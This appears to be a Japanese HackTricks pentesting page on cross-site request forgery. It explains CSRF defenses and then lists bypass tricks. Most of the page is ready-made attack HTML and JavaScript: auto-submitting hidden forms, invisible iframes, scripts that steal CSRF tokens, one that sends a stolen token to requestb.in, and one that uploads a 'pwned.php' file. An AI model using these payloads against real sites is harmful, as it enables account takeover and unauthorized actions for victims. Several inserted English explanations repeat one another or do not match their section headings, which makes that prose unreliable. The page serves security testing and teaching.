# CSRF（クロスサイトリクエストフォージェリ）

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグ報奨金について通知を受ける

💬 コミュニティディスカッションに参加する

## CSRFとは？

**クロスサイトリクエストフォージェリ（Cross-site request forgery、CSRF）**は、攻撃者がユーザーに意図しないアクションを実行させることができるウェブセキュリティの脆弱性です。\
これは、**ログインしているユーザー**が攻撃者が制御するウェブサイトにアクセスし、そこから悪意のあるJSコードを実行したり、フォームを送信したり、"画像"を**被害者のアカウント**に取得することで行われます。

### 必要条件

CSRFの脆弱性を悪用するためには、まず**悪用する重要なアクションを見つける必要があります**（パスワードやメールアドレスの変更、被害者をソーシャルネットワークでフォローさせる、より多くの特権を与えるなど）。セッションは**クッキーまたはHTTPベーシック認証ヘッダーにのみ依存**する必要があり、他のヘッダーはセッションの処理に使用できません。そして、リクエストに**予測不可能なパラメータ**がない必要があります。

この脆弱性を回避するためには、いくつかの**対策**が取られる場合があります。

### **一般的な防御策**

* [**SameSiteクッキー**](hacking-with-cookies/#samesite)：セッションクッキーがこのフラグを使用している場合、任意のウェブサイトからクッキーを送信できない場合があります。
* [**クロスオリジンリソース共有**](cors-bypass.md)：関連するアクションを悪用するために実行する必要があるHTTPリクエストの種類に応じて、被害者サイトの**CORSポリシー**を考慮する必要があります。_CORSポリシーは、単にGETリクエストまたはフォームからのPOSTリクエストを送信し、応答を読み取る必要がない場合には影響しません。_
* **パスワード**ユーザーにアクションを許可するように要求する。
* **キャプチャ**を解決する
* **リファラ**または**オリジン**ヘッダーを読み取る。正規表現が使用されている場合、次のようにバイパスできます。
* http://mal.net?orig=http://example.com（URLで終わる）
* http://example.com.mal.net（URLで始まる）
* POSTまたはGETリクエストのパラメータの**名前**を**変更**する
* 各セッションで**CSRFトークン**を使用する。このトークンは、アクションを確認するためにリクエスト内で送信する必要があります。このトークンはCORSで保護することができます。

### CSRFマップ

![](<../.gitbook/assets/image (112).png>)

## 防御回避

### POSTからGETへ

悪用したいフォームが**CSRFトークンを使用してPOSTリクエストを送信する準備ができているかどうか**を確認する必要がありますが、**GET**も**有効**であり、GETリクエストを送信するときに**CSRFトークンが引き続き検証されているかどうか**を確認する必要があります。

### トークンの欠如

一部のアプリケーションは、トークンが存在する場合に正しく**トークンを検証**しますが、**トークンが省略された場合に検証をスキップ**します。\
この状況では、攻撃者はトークンを含むパラメータ全体を（値だけでなく）削除して検証をバイパスし、CSRF攻撃を実行できます。

### CSRFトークンがユーザーセッションに関連付けられていない

一部のアプリケーションは、リクエストを行っているユーザーと同じセッションにトークンが属していることを**検証しない**場合があります。代わりに、アプリケーションは発行したトークンのグローバルプールを維持し、このプールに表示されるトークンを受け入れます。\
この状況では、攻撃者は自分のアカウントを使用してアプリケーションにログインし、**有効なトークンを取得**し、そのトークンをCSRF攻撃の被害者ユーザーに提供することができます。

### メソッドバイパス

リクエストが「**奇妙な**」**メソッド**を使用している場合、**メソッドオーバーライド機能**が機能しているかどうかを確認してください。\
たとえば、**PUT**メソッドを使用している場合、**POST**メソッドを使用して次のように送信できます：_https://example.com/my/dear/api/val/num?**\_method=PUT**_

これは、**\_methodパラメータをPOSTリクエスト内に送信**するか、**ヘッダー**を使用しても機能します。

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### カスタムヘッダートークンのバイパス

もしリクエストが**CSRF保護手法**として**トークン**を含む**カスタムヘッダー**を追加している場合は、以下の手順を試してみてください：

* **カスタムトークンとヘッダーを含まない**状態でリクエストをテストします。
* **同じ長さ**ですが**異なるトークン**を使用してリクエストをテストします。

### CSRFトークンはクッキーで検証されます

前述の脆弱性のさらなるバリエーションとして、一部のアプリケーションでは**クッキーとリクエストパラメーターの両方に同じトークンが複製される**ことがあります。または、**CSRFクッキーを設定し、バックエンドで送信されたCSRFトークンがクッキーに関連付けられたトークンと一致するかどうかをチェックします**。

次のリクエストが検証される際に、アプリケーションは単純に**リクエストパラメーターに送信されたトークンがクッキーに保存された値と一致するかどうかを確認**します。\
この状況では、攻撃者は再びCSRF攻撃を実行することができます。ただし、攻撃者が自身のCSRFクッキーをCRLFのように被害者に設定することを許す脆弱性がウェブサイトに存在する場合に限ります。

この場合、偽の画像を読み込むことを試みてクッキーを設定し、次にこの例のようにCSRF攻撃を実行することができます：
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
注意してください。**csrfトークンがセッションクッキーに関連している場合、この攻撃は機能しません**。なぜなら、被害者に自分のセッションを設定する必要があり、したがって自分自身を攻撃することになるからです。
{% endhint %}

### Content-Typeの変更

[**こちら**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)によると、**POST**メソッドを使用して**プリフライトを回避**するために、次のContent-Typeの値が許可されています。

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ただし、使用する**Content-Type**によっては、**サーバーのロジックが異なる場合がある**ため、上記の値や**`application/json`**、**`text/xml`**、**`application/xml`**などの他の値も試してみる必要があります。

[ここ](https://brycec.me/posts/corctf\_2021\_challenges)からのJSONデータをtext/plainとして送信する例:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### application/json preflight request bypass

既にご存知の通り、HTMLフォームを介してContent-Typeが**`application/json`**のPOSTリクエストを送信することはできません。また、**`XMLHttpRequest`**を使用して試みると、最初に**preflight**リクエストが送信されます。\
ただし、バックエンドがContent-Typeに関係なくデータを使用しているかどうかを確認するために、JSONデータをcontent types **`text/plain`** および **`application/x-www-form-urlencoded`** を使用して送信することができます。\
`Content-Type: text/plain` を使用してフォームを送信することができます。

サーバーがコンテンツタイプ "application/json" のみを受け入れる場合、preflightリクエストをトリガーせずにコンテンツタイプ "text/plain; application/json" を送信することができます。

また、**SWFフラッシュファイル**を使用してこの制限を**バイパス**することもできます。詳細については、[**この投稿**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)を参照してください。

### Referrer / Origin check bypass

**Refererヘッダーを回避する**

一部のアプリケーションでは、リクエストにRefererヘッダーが存在する場合にのみ、そのヘッダーを検証しますが、ヘッダーが省略された場合は検証をスキップします。
```markup
<meta name="referrer" content="never">
```
**正規表現のバイパス**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Referrerがパラメータ内で送信するURLのサーバーのドメイン名を設定するには、次のようにします：
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
***

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグ報酬について通知を受ける

💬 コミュニティディスカッションに参加する

## **攻撃例**

### **CSRFトークンの抽出**

もし**CSRFトークン**が**防御手段**として使用されている場合、[**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens)の脆弱性や[**Dangling Markup**](dangling-markup-html-scriptless-injection.md)の脆弱性を悪用して**抽出**することができます。

### **HTMLタグを使用したGET**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
自動的にGETリクエストを送信するために使用できる他のHTML5タグは次のとおりです：

![](<../.gitbook/assets/image (530).png>)

### フォームのGETリクエスト
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### フォームのPOSTリクエスト

To perform a Cross-Site Request Forgery (CSRF) attack, an attacker can create a malicious HTML page that includes a form with a POST method. This form is designed to submit data to a target website without the user's knowledge or consent.

To execute the attack, the attacker tricks the victim into visiting the malicious page. When the victim loads the page, the form is automatically submitted, sending the data to the target website. Since the victim is already authenticated on the target website, the server accepts the request and performs the desired action.

The key to a successful CSRF attack is to ensure that the victim is authenticated on the target website. This can be achieved by tricking the victim into clicking on a link or visiting a page that requires authentication before loading the malicious page.

To protect against CSRF attacks, web developers can implement measures such as using anti-CSRF tokens or checking the origin of the request. Additionally, users can protect themselves by being cautious when clicking on links or visiting unfamiliar websites.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframeを通じたフォームのPOSTリクエスト

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a victim into submitting a form through an invisible iframe. This technique is commonly used when the attacker wants to perform actions on behalf of the victim without their knowledge or consent.

To execute this attack, the attacker crafts a malicious webpage that contains an invisible iframe pointing to the target website. The attacker then creates a form within the iframe and sets the target website as the form's action. The form is pre-filled with the desired data and automatically submitted using JavaScript.

When the victim visits the attacker's webpage, the form is submitted in the background without their knowledge. Since the victim is already authenticated on the target website, the server processes the request as if it came directly from the victim. This allows the attacker to perform actions on the victim's behalf, such as changing their password, making purchases, or modifying their account settings.

To protect against this attack, web developers should implement measures such as using anti-CSRF tokens, validating the referrer header, and implementing strict SameSite cookie policies. Additionally, users should be cautious when clicking on unfamiliar links or visiting suspicious websites to minimize the risk of falling victim to CSRF attacks.
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST リクエスト**

Ajax POST リクエストは、ブラウザが非同期的にサーバーにデータを送信するための方法です。このリクエストは、Webアプリケーションの機能を利用して、ユーザーの操作なしにデータを送信することができます。

以下は、Ajax POST リクエストの基本的な構文です。

```javascript
$.ajax({
    url: "http://example.com/api",
    type: "POST",
    data: {
        param1: "value1",
        param2: "value2"
    },
    success: function(response) {
        console.log(response);
    },
    error: function(xhr, status, error) {
        console.log(error);
    }
});
```

この例では、`http://example.com/api` に対してPOSTリクエストが送信されます。`data` パラメータには、送信するデータが含まれています。成功した場合は、`success` 関数が呼び出され、レスポンスがコンソールに表示されます。エラーが発生した場合は、`error` 関数が呼び出され、エラーメッセージがコンソールに表示されます。

Ajax POST リクエストは、CSRF（Cross-Site Request Forgery）攻撃の潜在的な脆弱性を持っています。この攻撃では、攻撃者がユーザーの代わりに意図しないリクエストを送信することができます。この攻撃を防ぐためには、適切なCSRF対策を実装する必要があります。
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST リクエスト

In a multipart/form-data POST request, the data is sent as a series of parts, each containing a separate piece of data. This type of request is commonly used when uploading files or submitting forms with binary data.

To construct a multipart/form-data POST request, you need to set the `Content-Type` header to `multipart/form-data` and format the request body accordingly. Each part of the request body should be separated by a boundary, which is a unique string that acts as a delimiter between the parts.

Here is an example of a multipart/form-data POST request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="example.jpg"
Content-Type: image/jpeg

[Binary data of the file]
-----------------------------1234567890
Content-Disposition: form-data; name="name"

John Doe
-----------------------------1234567890--
```

In this example, the request body consists of two parts. The first part contains the file data, with the `Content-Disposition` header specifying the name and filename of the file, as well as the content type. The second part contains a form field named "name" with the value "John Doe".

When sending a multipart/form-data POST request, make sure to properly set the `Content-Length` header to indicate the total size of the request body.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POSTリクエスト v2

In this technique, we will explore how to perform a CSRF attack using a multipart/form-data POST request. This technique is useful when the target application uses this type of request to submit forms or upload files.

To execute this attack, we need to create a malicious HTML page that will contain a form with the necessary fields to perform the CSRF attack. The form should have the `enctype` attribute set to `multipart/form-data` and the `method` attribute set to `POST`. 

The fields in the form should match the fields expected by the target application. These fields can be identified by inspecting the HTML source code or by using a tool like Burp Suite. 

Once the form is created, we need to include it in a page that will be hosted on our server. This page should also include JavaScript code that will automatically submit the form when the page is loaded. 

When the victim visits our malicious page, the form will be submitted automatically, sending the crafted request to the target application. Since the victim is authenticated in the target application, the request will be processed as if it came from the victim's browser.

To protect against this type of attack, the target application should implement measures such as using anti-CSRF tokens or checking the `Referer` header to ensure that requests originate from the same domain.

By understanding and exploiting the vulnerabilities associated with multipart/form-data POST requests, we can gain unauthorized access to sensitive information or perform actions on behalf of the victim. It is important to note that performing CSRF attacks is illegal and should only be done with proper authorization and for ethical purposes.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### iframe 内からのフォーム POST リクエスト

When an HTML form is submitted, the browser sends a POST request to the specified URL. This behavior can be exploited in a Cross-Site Request Forgery (CSRF) attack when the form is submitted from within an iframe.

HTMLのフォームが送信されると、ブラウザは指定されたURLにPOSTリクエストを送信します。この挙動は、iframe内からフォームが送信された場合に、クロスサイトリクエストフォージェリ（CSRF）攻撃で悪用される可能性があります。

To perform a CSRF attack using an iframe, an attacker can create a webpage with an invisible iframe that loads the target website's form. The attacker can then use JavaScript to automatically submit the form without the user's knowledge.

iframeを使用してCSRF攻撃を実行するために、攻撃者は目的のウェブサイトのフォームを読み込む透明なiframeを持つウェブページを作成することができます。攻撃者はJavaScriptを使用して、ユーザーの知識を持たずにフォームを自動的に送信することができます。

This attack is possible because the browser includes the user's session cookies in the POST request, allowing the attacker to impersonate the user and perform actions on their behalf.

この攻撃が可能なのは、ブラウザがPOSTリクエストにユーザーのセッションクッキーを含めるためであり、攻撃者がユーザーをなりすまし、その代わりに操作を行うことができるからです。

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, which are unique tokens embedded in the form that are checked upon submission to ensure the request is legitimate.

CSRF攻撃に対抗するために、ウェブ開発者は、フォームに埋め込まれた一意のトークンを使用するなどの対策を実装する必要があります。これにより、リクエストが正当であることを確認することができます。
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRFトークンを盗み、POSTリクエストを送信する**

To perform a CSRF attack, you need to steal the CSRF token from the target website and then use it to craft a malicious POST request. Here's how you can do it:

1. **Stealing the CSRF Token**: The CSRF token is typically embedded in the HTML of the target website. You can use various techniques like cross-site scripting (XSS) or social engineering to trick the victim into executing a script that extracts the CSRF token. Once you have the token, store it for later use.

2. **Crafting the Malicious POST Request**: With the stolen CSRF token, you can now craft a POST request to perform the desired action on the target website. Make sure to include all the necessary parameters and values required by the target website's form. The CSRF token should be included as a parameter in the request body or as a custom header, depending on how the website handles CSRF protection.

3. **Sending the POST Request**: Once you have crafted the malicious POST request, you can send it to the target website. This can be done using various tools like cURL, Burp Suite, or custom scripts. Make sure to set the appropriate headers and cookies to mimic a legitimate request.

By stealing the CSRF token and sending a crafted POST request, you can trick the target website into performing actions on behalf of the victim without their consent. This can lead to various security vulnerabilities, such as unauthorized data modification or account takeover. It is important for web developers to implement proper CSRF protection mechanisms to mitigate these attacks.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRFトークンを盗み、iframe、フォーム、およびAjaxを使用してPOSTリクエストを送信する**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request. This can be achieved using an iframe, a form, and Ajax.

#### **Stealing the CSRF Token**

1. Create an iframe element in your attacker-controlled website.
2. Set the source of the iframe to the target website's login page or any other page that generates a CSRF token.
3. Use JavaScript to access the contents of the iframe and extract the CSRF token from the HTML source code.
4. Store the stolen CSRF token in a variable for later use.

#### **Sending a POST Request**

1. Create a hidden form element in your attacker-controlled website.
2. Set the action attribute of the form to the target website's vulnerable endpoint.
3. Set the method attribute of the form to "POST".
4. Include any required parameters in the form, such as the stolen CSRF token and any other necessary data.
5. Use JavaScript to automatically submit the form when the page loads or when triggered by an event.

#### **Using Ajax**

1. Create an Ajax request in your attacker-controlled website.
2. Set the URL of the request to the target website's vulnerable endpoint.
3. Set the method of the request to "POST".
4. Include any required parameters in the request, such as the stolen CSRF token and any other necessary data.
5. Send the Ajax request using JavaScript.

By stealing the CSRF token and using it to send a malicious POST request, you can trick the target website into performing actions on behalf of the victim user without their consent. This can lead to unauthorized actions, data manipulation, or even account takeover. It is important for web developers to implement proper CSRF protection mechanisms to prevent such attacks.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRFトークンを盗み、iframeとフォームを使用してPOSTリクエストを送信する**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request. One way to achieve this is by utilizing an iframe and a form.

まず、Cross-Site Request Forgery（CSRF）攻撃を実行するために、対象のウェブサイトからCSRFトークンを盗む必要があります。その後、このトークンを使用して悪意のあるPOSTリクエストを送信します。これを実現する方法の一つは、iframeとフォームを利用することです。

First, you need to create an iframe element in your attacker-controlled website. This iframe should have its source set to the target website's URL. By loading the target website within the iframe, you can access its DOM and extract the CSRF token.

まず、攻撃者が制御するウェブサイトでiframe要素を作成する必要があります。このiframeのソースは、対象のウェブサイトのURLに設定されている必要があります。iframe内で対象のウェブサイトを読み込むことで、そのDOMにアクセスし、CSRFトークンを抽出することができます。

Once you have obtained the CSRF token, you can use it to craft a malicious form. This form should have its action attribute set to the target website's vulnerable endpoint and include any necessary input fields. Make sure to include the stolen CSRF token as a hidden input field within the form.

CSRFトークンを入手したら、それを使用して悪意のあるフォームを作成します。このフォームのaction属性は、対象のウェブサイトの脆弱なエンドポイントに設定し、必要な入力フィールドを含めます。フォーム内には、盗まれたCSRFトークンを隠しフィールドとして含めるようにしてください。

Finally, you can submit the form programmatically using JavaScript. This can be done by calling the form's submit() method. When the form is submitted, the malicious POST request will be sent to the target website, potentially causing unauthorized actions to be performed on behalf of the victim.

最後に、JavaScriptを使用してフォームをプログラム的に送信します。これは、フォームのsubmit()メソッドを呼び出すことで行うことができます。フォームが送信されると、悪意のあるPOSTリクエストが対象のウェブサイトに送信され、被害者の代わりに権限のないアクションが実行される可能性があります。
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **トークンを盗み、2つのiframeを使用して送信する**

One way to perform a CSRF attack is by stealing a user's authentication token and then using it to make unauthorized requests on their behalf. In this technique, we will steal the token by tricking the user into visiting a malicious website that contains two iframes.

The first iframe will load the target website where the user is authenticated. This iframe will be hidden from the user's view using CSS. The second iframe will load a malicious website that we control.

When the user visits the malicious website, JavaScript code will be executed that will extract the authentication token from the first iframe. This can be done by accessing the `contentWindow` property of the first iframe and then accessing the token from its DOM.

Once the token is obtained, it can be used to make unauthorized requests on behalf of the user. This can be done by sending HTTP requests using JavaScript, either through the `XMLHttpRequest` object or the `fetch` API.

By using this technique, an attacker can trick a user into unknowingly performing actions on a target website without their consent. This can lead to various security vulnerabilities, such as changing account settings, making unauthorized purchases, or even performing actions with administrative privileges.

To protect against CSRF attacks, it is important to implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict access controls.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajaxを使用してCSRFトークンを盗み、フォームでPOSTリクエストを送信する**

In this technique, we will use Ajax to steal the CSRF token from the target website and then use it to send a POST request using a form.

このテクニックでは、Ajaxを使用してターゲットのウェブサイトからCSRFトークンを盗み、それを使用してフォームを使ってPOSTリクエストを送信します。

First, we need to retrieve the CSRF token from the target website. We can do this by making an Ajax request to a page that contains the CSRF token.

まず、ターゲットのウェブサイトからCSRFトークンを取得する必要があります。これは、CSRFトークンを含むページに対してAjaxリクエストを行うことで行うことができます。

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/path/to/csrf/page', true);
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    var csrfToken = extractCsrfToken(response);
    sendPostRequest(csrfToken);
  }
};
xhr.send();
```

Next, we extract the CSRF token from the response of the Ajax request. The `extractCsrfToken` function is a placeholder for your own implementation.

次に、AjaxリクエストのレスポンスからCSRFトークンを抽出します。`extractCsrfToken`関数は、独自の実装に置き換える必要があります。

Finally, we use the stolen CSRF token to send a POST request using a form. We create a hidden input field in the form with the name `csrf_token` and set its value to the stolen CSRF token. Then, we submit the form programmatically.

最後に、盗んだCSRFトークンを使用してフォームを使ってPOSTリクエストを送信します。フォーム内に`csrf_token`という名前の非表示の入力フィールドを作成し、その値を盗んだCSRFトークンに設定します。その後、フォームをプログラムで送信します。

```javascript
function sendPostRequest(csrfToken) {
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = '/path/to/post/endpoint';
  
  var csrfInput = document.createElement('input');
  csrfInput.type = 'hidden';
  csrfInput.name = 'csrf_token';
  csrfInput.value = csrfToken;
  
  form.appendChild(csrfInput);
  document.body.appendChild(form);
  
  form.submit();
}
```

By using this technique, we can steal the CSRF token from the target website and use it to perform unauthorized actions on behalf of the user.

このテクニックを使用することで、ターゲットのウェブサイトからCSRFトークンを盗み、ユーザーの代わりに不正なアクションを実行することができます。
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IOを使用したCSRF

Socket.IOは、Webアプリケーションでリアルタイムな双方向通信を実現するためのJavaScriptライブラリです。Socket.IOを使用してリアルタイムな通信を行うWebアプリケーションは、CSRF（Cross-Site Request Forgery）攻撃の潜在的な脆弱性にさらされる可能性があります。

